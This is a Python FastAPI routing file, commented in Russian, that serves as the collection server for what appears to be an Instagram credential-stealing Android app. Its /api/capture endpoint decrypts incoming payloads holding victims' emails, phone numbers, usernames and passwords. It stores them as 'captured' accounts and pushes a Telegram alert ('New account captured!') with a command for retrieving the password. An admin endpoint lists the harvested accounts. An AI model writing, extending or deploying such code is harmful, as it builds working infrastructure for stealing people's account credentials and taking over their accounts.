"""
api.py — FastAPI роутеры (эндпоинты).
- POST /api/capture — приём зашифрованных данных от Android
- GET /api/health — healthcheck
- GET /api/accounts — список аккаунтов (админ)
"""

import base64
import logging
from datetime import datetime

from fastapi import APIRouter, Depends, HTTPException, Header, status
from pydantic import BaseModel
from sqlalchemy.orm import Session

from app.config import settings
from app.crypto import crypto
from app.database import get_db
from app.models import InstagramAccount
from app.telegram_bot import send_notification

logger = logging.getLogger(__name__)
router = APIRouter()


# ================== Pydantic-модели запросов/ответов ==================


class CaptureRequest(BaseModel):
    """Тело запроса от Android-приложения."""
    payload: str       # Base64-зашифрованные данные (AES-256-GCM)
    device_id: str
    captured_at: int   # Unix timestamp


class CaptureResponse(BaseModel):
    """Ответ при успешном приёме данных."""
    success: bool
    message: str
    server_time: str


class AccountResponse(BaseModel):
    """Модель аккаунта для API-ответа (без пароля)."""
    id: int
    username: str | None
    full_name: str | None
    device_id: str | None
    captured_at: datetime
    category: str


# ================== Зависимости ==================


def verify_api_key(x_api_key: str = Header(...)):
    """Проверка API-ключа из заголовка X-API-Key."""
    if x_api_key != settings.API_KEY:
        raise HTTPException(
            status_code=status.HTTP_401_UNAUTHORIZED,
            detail="Неверный API-ключ"
        )
    return x_api_key


# ================== Эндпоинты ==================


@router.post(
    "/api/capture",
    response_model=CaptureResponse,
    status_code=status.HTTP_201_CREATED,
)
async def capture_data(
    request: CaptureRequest,
    db: Session = Depends(get_db),
    api_key: str = Depends(verify_api_key),
):
    """
    Основной эндпоинт для приёма данных от Android-приложения.
    Порядок обработки:
    1. Проверка API-ключа (verify_api_key)
    2. Декодирование payload из Base64
    3. Расшифровка на сервере (Fernet)
    4. Сохранение в PostgreSQL
    5. Уведомление в Telegram
    """
    try:
        # Декодирование payload
        encrypted_bytes = base64.b64decode(request.payload)
        decrypted_json = crypto.decrypt(encrypted_bytes)

        # Парсинг JSON
        import json
        data = json.loads(decrypted_json)

        email = data.get("email")
        phone = data.get("phone")
        username = data.get("username")
        password = data.get("password")
        full_name = data.get("fullName")

        # Шифрование чувствительных полей перед записью в БД
        account = InstagramAccount(
            username=username,
            email_encrypted=crypto.encrypt(email),
            phone_encrypted=crypto.encrypt(phone),
            password_encrypted=crypto.encrypt(password),
            full_name=full_name,
            device_id=request.device_id,
            captured_at=datetime.utcfromtimestamp(request.captured_at / 1000),
        )

        db.add(account)
        db.commit()
        db.refresh(account)

        logger.info(f"Аккаунт захвачен: @{username}, device={request.device_id}")

        # Уведомление в Telegram
        notif_text = (
            f"<b>Новый аккаунт захвачен!</b>\n"
            f"Username: @{username or '—'}\n"
            f"Email: {email or '—'}\n"
            f"Device: {request.device_id}\n"
            f"<code>/get {username}</code> — посмотреть пароль"
        )
        await send_notification(notif_text)

        return CaptureResponse(
            success=True,
            message="Данные успешно сохранены",
            server_time=datetime.utcnow().isoformat(),
        )

    except Exception as e:
        logger.error(f"Ошибка обработки capture: {e}")
        raise HTTPException(
            status_code=status.HTTP_500_INTERNAL_SERVER_ERROR,
            detail=f"Ошибка обработки: {str(e)}"
        )


@router.get("/api/health")
async def health_check():
    """Healthcheck — проверка доступности сервера."""
    return {
        "status": "ok",
        "timestamp": datetime.utcnow().isoformat(),
    }


@router.get("/api/accounts", response_model=list[AccountResponse])
async def list_accounts(
    db: Session = Depends(get_db),
    api_key: str = Depends(verify_api_key),
    limit: int = 50,
    offset: int = 0,
):
    """Список аккаунтов (без паролей)."""
    accounts = (
        db.query(InstagramAccount)
        .order_by(InstagramAccount.captured_at.desc())
        .offset(offset)
        .limit(limit)
        .all()
    )
    return [
        AccountResponse(
            id=acc.id,
            username=acc.username,
            full_name=acc.full_name,
            device_id=acc.device_id,
            captured_at=acc.captured_at,
            category=acc.category,
        )
        for acc in accounts
    ]
